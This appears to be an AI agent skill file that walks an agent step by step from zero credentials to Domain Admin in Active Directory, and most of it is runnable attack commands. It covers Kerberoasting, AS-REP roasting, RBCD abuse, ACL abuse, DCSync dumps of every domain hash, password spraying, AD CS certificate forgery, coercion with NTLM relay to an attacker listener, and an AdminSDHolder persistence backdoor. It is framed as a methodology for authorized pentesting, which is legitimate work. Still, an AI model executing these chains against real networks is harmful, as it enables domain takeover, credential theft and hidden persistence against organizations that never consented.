---
name: ad-recon
description: Full Active Directory attack-path enumeration and exploitation methodology on Linux: comprehensive LDAP/SMB/RPC enumeration from zero-creds to Domain Admin, BloodHound attack-graph analysis, Kerberos weaknesses (AS-REP roasting, Kerberoasting, resource-based constrained delegation abuse), GenericAll/ACL exploitation chains, credential harvesting (DCSync, LAPS, GPP), AD CS attacks (ESC1-ESC8), NTLM relay and coercion (PetitPotam/PrinterBug), and persistence detection. Every finding tagged to MITRE ATT&CK. Structured Markdown report output.
license: MIT
metadata:
  version: "1.0.0"
  author: community
  tags: ["active-directory", "ad", "kerberos", "bloodhound", "internal-pentest", "privilege-escalation", "lateral-movement", "dcsync", "acl-abuse"]
---

# AD Recon: Active Directory Attack Path Enumeration & Exploitation

A structured, **iterative methodology** for enumerating, analyzing, and compromising Active Directory environments from Linux. Starts from zero credentials and escalates to full domain compromise through enumeration, vulnerability discovery, and **multi-stage exploitation chains**. Every phase feeds into the next; each credential unlock cascades into deeper access.

When this skill is active, **follow the phases in order but iterate**: Phase 0 output feeds Phase 1, Phase 3 findings unlock Phase 4 abuses, Phase 5 credentials upgrade Phase 1, etc. Run each command, collect output, and build the final Markdown report incrementally. Always operate within scope and rules of engagement: AD attack tooling is intrusive, and some techniques (password spraying, DCSync, ticket forging, coercion attacks) can lock out accounts, trigger EDR alerts, or destabilize directory replication if misconfigured.

---

## Pre-flight: Tool Check

Before starting, verify required tools are available:

```bash
for tool in nxc netexec crackmapexec impacket-GetNPUsers impacket-GetUserSPNs impacket-secretsdump impacket-psexec impacket-addcomputer ldapsearch kerbrute bloodhound-python certipy-ad smbclient rpcclient enum4linux-ng dig; do
  command -v $tool >/dev/null 2>&1 && echo "$tool OK" || echo "$tool MISSING"
done
```

`nxc` (NetExec) has replaced CrackMapExec upstream. If `nxc` is missing, use `crackmapexec` as fallback. Install missing tools:

```bash
# Impacket suite (comprehensive)
pipx install impacket

# NetExec (unified SMB/LDAP/Kerberos enum)
pipx install netexec

# BloodHound ingestor
pipx install bloodhound

# Certipy (AD CS enumeration/abuse)
pipx install certipy-ad

# kerbrute (silent Kerberos user enum, no event logs)
go install github.com/ropnop/kerbrute@latest

# enum4linux-ng (legacy RPC/RID fallback)
git clone https://github.com/cddmp/enum4linux-ng /opt/enum4linux-ng
```

Inform the user of any tools that could not be installed and note which phases will be skipped or degraded. **Critical for AD recon**: having `nxc` + `bloodhound-python` + `impacket` is the minimum viable toolkit; everything else is force-multiplier bonus.

---

## Setup: Target Variables & Working Directory

```bash
DC_IP="<domain controller IP>"
DOMAIN="<domain.local>"        # FQDN, from Phase 0 if unknown at start
NETBIOS="<DOMAIN>"             # NetBIOS name, from SMB banner if not known
USER=""                        # username, blank if fully unauthenticated
PASS=""                        # password, leave blank if none
HASH=""                        # NTLM hash for pass-the-hash, format :NT or LM:NT
WORKDIR="/tmp/ad-recon/$DOMAIN"
mkdir -p "$WORKDIR"/{loot,bloodhound,tickets,secrets,relay}

echo "Target DC: $DC_IP | Domain: $DOMAIN | Auth: ${USER:-anonymous}"
```

Use these variables throughout. **Update them as credentials are obtained in later phases**: this skill is **iterative**: each phase's output can unlock the next. If you crack a password in Phase 3, re-run Phase 1 as that new principal. If you find DCSync rights in Phase 4, pivot to Phase 5 immediately.

---

## Phase 0: Unauthenticated / Anonymous Enumeration

**Goal:** Establish domain identity, detect misconfigurations, enumerate valid usernames. **No credentials required.** This phase alone can yield valid accounts for Phase 3 attacks.

### 0.1 Domain identity via SMB, LDAP, DNS

```bash
nmap -p88,389,445,464,636,3268,3269 -sV "$DC_IP" -oN "$WORKDIR/loot/nmap-dc.txt"

# Domain name from SMB banner
nxc smb "$DC_IP" | tee "$WORKDIR/loot/nxc-smb-anon.txt"

# Domain name + forest from LDAP (null/anonymous bind test)
ldapsearch -x -H "ldap://$DC_IP" -s base namingcontexts 2>&1

# Forward/reverse DNS
dig -x "$DC_IP" @8.8.8.8
dig "$DOMAIN" @8.8.8.8
```

Record: NetBIOS name, FQDN, DC hostname, OS build, whether null auth/anonymous LDAP is enabled.

### 0.2 Null session / anonymous LDAP bind

```bash
nxc smb "$DC_IP" -u '' -p '' --shares
nxc smb "$DC_IP" -u 'guest' -p '' --shares

enum4linux-ng -A "$DC_IP" -oY "$WORKDIR/loot/enum4linux.yaml"

# Anonymous LDAP: list all users
ldapsearch -x -H "ldap://$DC_IP" -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" '(objectClass=user)' sAMAccountName userAccountControl 2>&1 | tee "$WORKDIR/loot/ldap-anon-users.txt"
```

**Flag as critical**: 
- Anonymous LDAP bind returning user objects
- Null-session SMB access to shares
- World-readable SYSVOL or NETLOGON

### 0.3 Username enumeration via Kerberos pre-auth (silent, no event logs)

Kerberos pre-auth enumeration doesn't log `4625` (failed logon) events: it only touches the KDC, not SAM. This is the **lowest-noise way** to discover valid usernames.

```bash
# Wordlist: combine rockyou + common AD usernames (admin, svc_, test_, etc.)
kerbrute userenum -d "$DOMAIN" --dc "$DC_IP" /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o "$WORKDIR/loot/valid-users.txt" --delay 100ms

# RID cycling (alternative, requires null SMB session)
rpcclient -U "" -N "$DC_IP" -c "lookupnames administrator" 2>&1
for rid in $(seq 500 1200); do
  rpcclient -U "" -N "$DC_IP" -c "lookupsids S-1-5-21-<domain-sid>-$rid" 2>&1 | grep -v "SID does not"
done
```

Every valid username here feeds **Phase 3 (AS-REP roasting)**: no password required, just a valid username.

### 0.4 Password policy & lockout threshold

**Critical before Phase 5 (password spray).** Exceeding the lockout threshold can lock accounts and burn your access.

```bash
nxc smb "$DC_IP" -u '' -p '' --pass-pol 2>&1 | tee "$WORKDIR/loot/pass-policy.txt"
```

Note: `lockoutThreshold`, `lockOutObservationWindow`, `minPwdAge`. If threshold is 0 (no lockout), password spraying is safer. If threshold is 5, never exceed 4 guesses per account per window.

### 0.5 Shares open to Everyone/Guest

```bash
nxc smb "$DC_IP" -u '' -p '' --shares
smbclient -N -L "//$DC_IP/" 2>&1
```

**Flag**: SYSVOL/NETLOGON readable is normal; anything else world-readable (BACKUP, ARCHIVE, DATA, etc.) is high-value. Check Phase 5.2 for GPP passwords in SYSVOL and Phase 5.3 for LAPS.

---

## Phase 1: Authenticated Enumeration (Requires ≥1 Valid Credential)

**Goal:** Full LDAP sweep, forest structure, computer inventory, group memberships, effective permissions.

### 1.1 Validate credentials and check local admin access

```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" 2>&1 | tee "$WORKDIR/loot/nxc-smb-auth.txt"
```

If output contains `(Pwn3d!)`, this account is a local admin on the DC: **jump directly to Phase 5 for credential dumping.**

### 1.2 Full LDAP enumeration via NetExec

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" --bloodhound -c All --dns-server "$DC_IP" 2>&1 | tee "$WORKDIR/loot/ldap-full-enum.txt"
```

This is faster than raw `ldapsearch` and outputs in BloodHound-compatible JSON. If BloodHound module is misconfigured, fall back to raw `ldapsearch`:

```bash
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" '(objectClass=*)' > "$WORKDIR/loot/ldap-full-dump.ldif"
```

### 1.3 Trust and forest structure

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M enum_trusts 2>&1 | tee "$WORKDIR/loot/trusts.txt"

# Raw LDAP: trustedDomain objects (cross-forest/cross-domain trusts)
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" '(objectClass=trustedDomain)' cn trustDirection trustType
```

**Record:** Every trust direction (inbound/outbound), transitive status, whether SID filtering is enabled. Cross-forest trusts with SID history enabled are escalation paths.

### 1.4 Domain computers, OUs, EOL systems

```bash
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" '(objectClass=computer)' dNSHostName operatingSystem userAccountControl 2>&1 | grep -E "^dn:|dNSHostName|operatingSystem|userAccountControl"
```

**Flag:**
- `operatingSystem` containing "Windows 7", "Windows Server 2008", "Windows Server 2003" → EOL, likely unpatched, SMB/Kerberos weaknesses
- `userAccountControl` with `0x100000` (1048576 decimal) = `TRUSTED_FOR_DELEGATION` → unconstrained delegation risk

---

## Phase 2: BloodHound Collection & Attack Graph Analysis

**Goal:** Turn LDAP data into graph queries for shortest paths to Domain Admin.

### 2.1 Collect via bloodhound-python

```bash
bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -ns "$DC_IP" -c All --zip -o "$WORKDIR/bloodhound" 2>&1
```

Output: `$WORKDIR/bloodhound/TIMESTAMP_bloodhound.zip` containing JSON for Nodes (Users, Groups, Computers, Domains) and Relationships (MemberOf, HasSession, AdminTo, etc.).

**Import into BloodHound (Community Edition / neo4j backend)** and run built-in queries:
- Shortest Paths to Domain Admins
- Shortest Paths from Owned Objects (mark any compromised principal as "Owned" first via the context menu)
- Kerberoastable Users to Domain Admins
- Computers with Unconstrained Delegation
- Dangerous Inbound ACLs

### 2.2 Custom Cypher for attack path discovery

```cypher
// All paths from current user to DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN p

// Kerberoastable users with a path to DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN u.name, length(p)

// Any non-admin with dangerous ACE on DA group or users
MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword]->(m:Group {name:"DOMAIN ADMINS@DOMAIN"})
WHERE NOT n.name CONTAINS "DOMAIN ADMINS"
RETURN n.name, type(r), m.name

// Resources with unconstrained delegation
MATCH (c:Computer {unconstrained:true})
RETURN c.name, c.enabled
```

**Critical:** BloodHound shows **what is possible**, not what is **guaranteed to work**. An ACE exists, but is the target in Protected Users? Does LAPS randomization prevent credential reuse? Verify findings in Phases 3-5 before trusting them.

### 2.3 Manual ACL enumeration via dacledit.py

```bash
# Scan all objects for dangerous ACEs held by your current user
dacledit.py -action read -target-dn "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS" 2>&1 | tee "$WORKDIR/loot/all-acls.txt"

# Specifically check protected groups
for target in "Domain Admins" "Enterprise Admins" "Administrators" "krbtgt"; do
  dacledit.py -action read -target "$target" -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS" 2>&1 | grep -E "ACE\[|Trustee|Access mask.*Full|Access mask.*Control|Access mask.*Write"
done
```

---

## Phase 3: Kerberos Attacks

**Goal:** Extract crackable Kerberos hashes without ever touching password hashes on disk.

### 3.1 AS-REP Roasting (no credentials required)

Targets accounts with `Do not require Kerberos preauthentication` flag set (userAccountControl bit 0x400000). Works against usernames from Phase 0.3.

```bash
impacket-GetNPUsers "$DOMAIN/" -usersfile "$WORKDIR/loot/valid-users.txt" -no-pass -format hashcat -outputfile "$WORKDIR/tickets/asrep.hash" 2>&1

# Crack offline
hashcat -m 18200 "$WORKDIR/tickets/asrep.hash" /usr/share/wordlists/rockyou.txt -O
```

**No passwords needed, no lockout risk, no event log.**

### 3.2 Kerberoasting (requires ≥1 valid credential)

Targets service accounts (`servicePrincipalName` set). The TGS-REP is encrypted with the account's **NTLM hash**, which is **crackable offline**.

```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile "$WORKDIR/tickets/spn.hash" 2>&1

# Crack (mode 13100 for RC4 TGS, 19700 for AES TGS)
hashcat -m 13100 "$WORKDIR/tickets/spn.hash" /usr/share/wordlists/rockyou.txt -O
```

**Every cracked SPN account feeds Phase 4**: check if they're in a privileged group.

### 3.3 Targeted Kerberoasting via writable SPN (self-service escalation)

If your current principal has `GenericWrite`/`GenericAll` on another user (from Phase 2/4), you can **set an SPN on it** even if it wasn't a service account originally, then roast it.

```bash
impacket-addspn.py -u "$DOMAIN\\$USER" -p "$PASS" -s "http/fake.example.com" "$DOMAIN\\TARGET_USER" -dc-ip "$DC_IP"

impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" -request -outputfile "$WORKDIR/tickets/targeted-spn.hash"
hashcat -m 13100 "$WORKDIR/tickets/targeted-spn.hash" /usr/share/wordlists/rockyou.txt
```

### 3.4 Resource-based Constrained Delegation abuse (RBCD) via Kerberos

If the current user has `GenericWrite` on a computer object, abuse RBCD:

```bash
# Check if we can add a computer account (default MachineAccountQuota is 10)
impacket-addcomputer.py "$DOMAIN/$USER:$PASS" -computer-name ATTACKERPC -computer-pass 'P@ssw0rd!' -dc-ip "$DC_IP"

# Configure RBCD on the target computer to trust our new machine
impacket-rbcd.py -delegate-from ATTACKERPC$ -delegate-to TARGETPC$ -action write "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP"

# Abuse: get an ST (service ticket) as any user (e.g. Administrator) to the target
impacket-getST.py -spn "cifs/targetpc.$DOMAIN" -impersonate Administrator "$DOMAIN/ATTACKERPC\$:P@ssw0rd!" -dc-ip "$DC_IP"

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec.py -k -no-pass "$DOMAIN/Administrator@targetpc.$DOMAIN"
```

---

## Phase 4: ACL Abuse & Dangerous Effective Permissions

**Goal:** Exploit `GenericAll`, `WriteDacl`, `ForceChangePassword`, and other ACEs for lateral movement / privilege escalation.

### 4.1 GenericAll on user: password reset or shadow credentials

```bash
# Direct password reset (requires GenericAll)
impacket-changepasswd.py "$DOMAIN/$USER:$PASS"@"$DC_IP" -newpass 'NewP@ssw0rd!' -altuser TARGET_USER

# OR: shadow credentials (PKINIT, no password change needed, less noisy)
certipy-ad shadow auto -u "$USER@$DOMAIN" -p "$PASS" -account TARGET_USER -dc-ip "$DC_IP"
```

### 4.2 GenericAll on group: add yourself as member

```bash
# Via LDAP (fastest)
python3 << 'EOF'
from ldap3 import Server, Connection, NTLM, MODIFY_ADD
s = Server("DC_IP")
c = Connection(s, user="DOMAIN\\USER", password="PASS", authentication=NTLM, auto_bind=True)
c.modify("CN=TARGET_GROUP,CN=Users,DC=...,DC=...", {'member': [(MODIFY_ADD, ["CN=YOUR_USER,OU=...,DC=...,DC=..."])]})
EOF

# Via SMB/RPC (fallback)
net rpc group addmem "TARGET_GROUP" "YOUR_USER" -U "$DOMAIN/$USER%$PASS" -S "$DC_IP"
```

### 4.3 WriteDacl: grant yourself GenericAll, then escalate

```bash
# Write an ACE granting yourself FullControl
dacledit.py -action write -target-dn "CN=TARGET_OBJECT,DC=...,DC=..." -principal "$USER" -rights FullControl -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"

# Then abuse as GenericAll
```

### 4.4 Protected Groups (Domain Admins, Enterprise Admins, Administrators, krbtgt)

**Important:** These groups have `adminCount=1` and are protected by **SDProp** (Security Descriptor Propagator). Every 60 minutes, their ACLs reset to match `CN=AdminSDHolder,CN=System,DC=...`.

**If you find GenericAll on a protected group:**
1. **Act within 60 minutes** before SDProp wipes the ACE
2. Add yourself to the group via LDAP (Phase 4.2)
3. **Verify immediately** via remote LDAP read (not cached AD: provider)
4. **For persistence**: grant the ACE on `AdminSDHolder` itself so SDProp propagates it down instead of erasing it

```bash
dacledit.py -action write -target-dn "CN=AdminSDHolder,CN=System,DC=...,DC=..." -principal "$USER" -rights FullControl -dc-ip "$DC_IP" "$DOMAIN/$USER:$PASS"
```

---

## Phase 5: Credential Harvesting & Lateral Movement

**Goal:** Extract credentials from every angle: LSASS, SAM, NTDS.dit, cached tickets, GPP passwords.

### 5.1 DCSync (full NTDS dump: domain compromise)

If your current principal has `Replicating Directory Changes` + `Replicating Directory Changes All` rights (either directly or via group membership, verified in Phase 2/4):

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS@$DC_IP" -just-dc -outputfile "$WORKDIR/secrets/dcsync"
```

Output: every user and computer hash in the domain. **This is domain compromise.**

### 5.2 GPP (Group Policy Preferences) passwords in SYSVOL

Legacy Group Policy Preferences store passwords in `SYSVOL` AES-encrypted with a **published Microsoft key**. Decryptable.

```bash
nxc smb "$DC_IP" -u "$USER" -p "$PASS" -M gpp_password 2>&1

# Manual: download from SYSVOL
smbclient -U "$USER%$PASS" "//$DC_IP/SYSVOL" -c 'recurse ON; prompt OFF; mget *.xml' -D "$WORKDIR/loot/gpp"

# Decrypt
grep -ril cpassword "$WORKDIR/loot/gpp" | while read f; do echo "=== $f ===" && strings "$f" | grep cpassword; done
```

### 5.3 LAPS (Local Administrator Password Solution) readers

If a non-privileged user has read access to `ms-Mcs-AdmPwd` (LAPS), they can read every computer's local admin password.

```bash
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M laps 2>&1
```

### 5.4 Cached credentials & LSASS (requires local admin)

```bash
impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET_HOST" -outputfile "$WORKDIR/secrets/lsass-dump"
```

### 5.5 Password spraying (low-noise, requires lockout threshold awareness)

```bash
# Test ONE password against all users (lowest noise)
nxc smb "$DC_IP" -u "$WORKDIR/loot/valid-users.txt" -p 'Winter2024!' --continue-on-success 2>&1 | tee "$WORKDIR/loot/spray-results.txt"

# Common patterns: Company+Year, Seasonal, Default+Sequence
# Examples: Acme@2024, Spring2024, Admin123, Password1
```

---

## Phase 6: AD CS (Certificate Services) & ESC1-ESC8

**Goal:** Find and exploit AD CS misconfigurations for certificate-based authentication bypass.

```bash
certipy-ad find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC_IP" -vulnerable -stdout 2>&1 | tee "$WORKDIR/loot/adcs-enum.txt"
```

| ESC Class | Misconfiguration | Exploit |
|---|---|---|
| ESC1 | Template allows client-supplied SAN + client auth EKU + low-priv enroll | Request cert as any user (e.g. Administrator) |
| ESC2 | Template has "Any Purpose" EKU or no EKU | Cert usable for any auth purpose |
| ESC3 | Enrollment Agent template misassigned | Enroll on behalf of target |
| ESC4 | Weak ACL on template object | Reconfigure to ESC1, then exploit |
| ESC6 | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag | SAN injection on any template |
| ESC7 | Weak ACL on CA object itself | Escalate to CA admin, issue arbitrary certs |
| ESC8 | HTTP enrollment enabled, no channel binding | NTLM relay to CA web enrollment |

```bash
# ESC1: request cert as Administrator
certipy-ad req -u "$USER@$DOMAIN" -p "$PASS" -ca CANAME -template VULNTEMPLATE -upn administrator@$DOMAIN -dc-ip "$DC_IP"

# Authenticate using the cert (PKINIT)
certipy-ad auth -pfx administrator.pfx -dc-ip "$DC_IP"
```

---

## Phase 7: Coercion Attacks & NTLM Relay (Advanced)

**Goal:** Force DC/high-value account to authenticate to a relay listener, then modify LDAP or AD CS.

### 7.1 Authentication coercion vectors

**PetitPotam** (MS-EFSRPC):
```bash
python3 petitpotam.py -u "$USER" -p "$PASS" "<attacker-listener-ip>" "$DC_IP"
```

**PrinterBug** (MS-RPRN):
```bash
python3 printerbug.py "<attacker-listener-ip>" "$DC_IP" -u "$USER" -p "$PASS"
```

**DFSCoerce** (MS-DFSNM):
```bash
python3 dfscoerce.py -u "$USER" -p "$PASS" "<attacker-listener-ip>" "$DC_IP"
```

### 7.2 NTLM relay to LDAP

```bash
# Start relay listener (on your attacker machine)
impacket-ntlmrelayx.py -t ldap://"$DC_IP" -l "$WORKDIR/relay" --no-dump --no-da -wh attacker-ip

# Trigger coercion in another terminal
python3 petitpotam.py -u "$USER" -p "$PASS" "attacker-ip" "$DC_IP"
```

On success, ntlmrelayx will add a new machine account or grant ACEs to your user.

---

## Phase 8: Persistence Indicator Detection

**Goal:** Hunt for signs of prior compromise or backdoor setup.

```bash
# AdminSDHolder tampering
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "CN=AdminSDHolder,CN=System,DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" nTSecurityDescriptor 2>&1

# DSRM (Directory Services Restore Mode) account
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M dsrm 2>&1

# SID History on users outside migration window
nxc ldap "$DC_IP" -u "$USER" -p "$PASS" -M sidhistory 2>&1

# krbtgt password age (golden ticket exposure window)
ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "CN=krbtgt,CN=Users,DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" pwdLastSet
```

---

## Phase 9: Output: Structured Markdown Report

Produce the following report, filling every section with findings from Phases 0-8:

```markdown
# AD Recon Report

**Domain:** `<domain.local>` (NetBIOS: `<DOMAIN>`)
**Domain Controller:** `<hostname>` (`<IP>`): `<OS build>`
**Starting access:** `<unauthenticated / username@domain>`
**Ending access:** `<highest privilege obtained>`
**Analysis date:** `<YYYY-MM-DD>`

---

## Risk Summary

| Category | Findings | Highest Severity | Remediation Priority |
|---|---|---|---|
| Kerberos Weaknesses (AS-REP, Kerberoasting, RBCD) | N | Critical / High / Medium | Immediate |
| ACL & Delegation Abuse | N | ... | ... |
| Credential Exposure (GPP, LAPS, cached) | N | ... | ... |
| AD CS Misconfiguration (ESC1-8) | N | ... | ... |
| Persistence Indicators | N | ... | ... |
| Password Spray / Brute Force | N | ... | ... |
| Trust Abuse / Cross-Forest | N | ... | ... |
| **Total** | **N** | **Critical / High / Medium** | **N/A** |

**Overall Risk Rating:** [Critical / High / Medium / Low]  
**Path to Domain Admin Found:** [Yes: N steps / No / Partial]

---

## 1. Domain Overview

| Property | Value |
|---|---|
| Forest / Domain | |
| Domain Functional Level | |
| Forest Functional Level | |
| Domain Controllers | |
| Trusts (count / types) | |
| EOL/Unpatched hosts | |
| Configured LAPS | |

---

## 2. Credential Status

| Account | Source | Privilege Level | Status |
|---|---|---|---|
| | | | Cracked / Exploited / Obtained |

---

## 3. Kerberos Findings

### 3.1 AS-REP Roastable Accounts (no pre-auth)

| Account | Cracked | Hash Type | Group Membership |
|---|---|---|---|

### 3.2 Kerberoastable Accounts (SPN set)

| Account | SPN | Cracked | Password | Group Membership |
|---|---|---|---|---|

### 3.3 Constrained / Unconstrained Delegation

| Computer | Type | Delegate Target | Exploitable |
|---|---|---|---|

---

## 4. ACL & Permission Findings

| Principal | Right | Target | Impact | Exploited |
|---|---|---|---|---|
| | GenericAll / WriteDacl / WriteOwner / AddMember / ... | | Critical / High / Medium | Yes / No |

---

## 5. Credential Exposure

| Type | Source | Value (truncated) | Severity |
|---|---|---|---|
| NTLM Hash | DCSync / LSASS / NTDS | aad3b435b51404ee... | Critical |
| Plaintext Password | GPP / LAPS / cached | P@ssw****** | High |

---

## 6. AD CS Findings (if applicable)

| Template / CA | ESC Class | Exploitable By | Severity |
|---|---|---|---|

---

## 7. MITRE ATT&CK Mapping

| Finding | Technique | Tactic | Severity |
|---|---|---|---|
| Kerberoastable service account | T1558.003 | Credential Access | Critical |
| GenericAll on Domain Admins | T1098 / T1484 | Persistence / Privilege Escalation | Critical |

---

## 8. Attack Path Summary

**Shortest verified path to Domain Admin:** [N steps]

**Top 3 findings to remediate immediately:**
1. [Most critical]
2. [Second]
3. [Third]

**Suggested next steps:**
- Credential rotation required: [list]
- ACL remediation: [list]
- Further testing: [patch validation, trust hardening, coercion surface]
```

---

## Known Detection Gaps

**Remote ACL inspection:** Tools like `dacledit.py` and PowerView.py may fail to detect `GenericAll` on protected objects due to LDAP filtering. If Phase 4 returns no findings but privilege escalation is suspected, verify manually on the DC via PowerShell `Get-Acl "AD:\..."`.

**Password pattern guessing:** Before large sprays, try organization-specific patterns (`Company@YEAR`, seasonal terms, role-based sequences). A single well-guessed password is faster than a full spray and avoids lockout.

**Relay surface:** NTLM relay attacks require:
1. Disabled LDAP signing / channel binding (check Phase 0)
2. A coercion vector that works in the target's environment
3. Firewall/network path from target to your relay listener

---

## Reference Files

- `references/ad-attack-patterns.md`: Complete command/tool reference for every attack primitive (Kerberoasting, ACL abuse, delegation, AD CS, NTLM relay, coercion). Severity ratings, tool syntax, and real-world exploitation code.
- `references/attck-ad-mapping.md`: MITRE ATT&CK technique-to-finding mapping with remediation guidance per technique. Use to tag findings for SOC/incident-response reporting.
